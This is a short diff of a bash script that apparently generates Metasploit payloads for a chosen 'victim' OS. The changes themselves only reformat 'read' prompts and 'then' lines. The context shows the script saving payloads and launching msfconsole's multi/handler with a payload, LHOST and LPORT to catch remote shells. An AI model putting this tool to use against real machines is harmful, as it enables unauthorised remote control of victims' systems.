@@ -216,7 +216,8 @@ echo -e " ${White}[1] ${Blue}Windows"
 echo -e " ${White}[2] ${Blue}Android"
 echo -e " ${White}[3] ${Blue}Linux\n"
 sleep 0.3
-echo -ne "${Green}[#] Choose Victim's OS:${White} "  ;  read OS
+echo -ne "${Green}[#] Choose Victim's OS:${White} " 
+read OS
 
 case  $OS  in
 
@@ -240,12 +241,15 @@ esac
 
 echo -e "${Purple}[*] Payload has been saved in the desktop folder '${Cyan}payloads${Purple}'"
 sleep 0.3
-echo -ne "${Green}[#] Do you want to automatically configure the handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" ; read p
-if [ $p  =  "y" ] ; then
+echo -ne "${Green}[#] Do you want to automatically configure the handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" 
+read p
+if [ $p  =  "y" ] 
+then
     clear
     echo -e "${Green}[*] OPENING ${Purple}MSFCONSOLE${Green}... "
     msfconsole -q -x "use multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit "
-elif [ $p  =  "n" ] ; then
+elif [ $p  =  "n" ] 
+then
     echo -e "${Cyan}[*] Byee! See you soon."  
     sleep 0.2 
     exit
